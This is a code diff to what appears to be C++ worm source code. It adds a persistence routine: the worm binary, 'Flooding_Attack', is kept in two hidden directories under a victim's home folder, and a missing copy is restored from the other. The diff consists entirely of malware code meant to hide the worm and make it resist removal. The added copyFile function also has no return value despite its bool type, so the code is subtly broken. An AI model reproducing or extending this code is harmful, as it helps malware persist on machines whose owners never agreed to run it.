@@ -13,6 +13,7 @@
 #include <sys/stat.h>
 #include <sys/wait.h>
 #include <unistd.h>
+#include <fstream>
 #include <iostream>
 #include <string>
 
@@ -20,7 +21,11 @@
 #define LOCATION_A "/home/victim/.etc/.module/Flooding_Attack"
 #define LOCATION_B "/home/victim/.firefox/.module/Flooding_Attack"
 
-std::string path_bin;
+bool copyFile(const char* srcpath, const char* dstpath) {
+    std::ifstream src(srcpath, std::ios::binary);
+    std::ofstream dst(dstpath, std::ios::binary);
+    dst << src.rdbuf();
+}
 
 // Queires if the program is running by given PID.
 bool isWormRunning(pid_t pid) {
@@ -33,9 +38,11 @@ bool isWormRunning(pid_t pid) {
 std::string isWormDistributed() {
     struct stat buffer;
     if (stat(LOCATION_A, &buffer) == 0) {
+        if (stat(LOCATION_B, &buffer) != 0) copyFile(LOCATION_A, LOCATION_B);
         return LOCATION_A;
     }
     if (stat(LOCATION_B, &buffer) == 0) {
+        if (stat(LOCATION_A, &buffer) != 0) copyFile(LOCATION_B, LOCATION_A);
         return LOCATION_B;
     }
     return "";
